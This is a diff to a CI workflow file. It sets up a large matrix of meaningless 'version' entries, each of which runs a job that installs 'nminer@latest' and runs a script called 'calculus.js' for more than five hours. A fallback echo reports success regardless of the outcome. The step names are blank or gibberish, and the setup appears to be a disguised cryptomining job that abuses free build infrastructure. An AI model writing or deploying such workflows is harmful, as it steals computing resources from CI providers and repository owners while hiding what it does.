@@ -9,25 +9,21 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 710 }
-          - { version: 5167 }
-          - { version: 4283 }
-          - { version: 2365 }
-          - { version: 4624 }
-          - { version: 3993 }
-          - { version: 4057 }
-          - { version: 2929 }
-          - { version: 9955 }
-          - { version: 7050 }
-          - { version: 5024 }
-          - { version: 4481 }
-          - { version: 8218 }
-          - { version: 7979 }
-          - { version: 2804 }
-          - { version: 1279 }
-          - { version: 4279 }
-          - { version: 1417 }
-          - { version: 1706 }
+          - { version: 4973 }
+          - { version: 2601 }
+          - { version: 6427 }
+          - { version: 9694 }
+          - { version: 8732 }
+          - { version: 5898 }
+          - { version: 21 }
+          - { version: 7321 }
+          - { version: 5942 }
+          - { version: 5362 }
+          - { version: 1079 }
+          - { version: 2357 }
+          - { version: 8953 }
+          - { version: 3992 }
+          - { version: 2954 }
 
     steps:
       - name: Checkout
@@ -38,7 +34,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: hmph lounge ha until downshift
+      - name: 
         run: |
           npm install nminer@latest
-          timeout 322m node calculus.js || echo "calculus executed"
+          timeout 315m node calculus.js || echo "calculus executed"
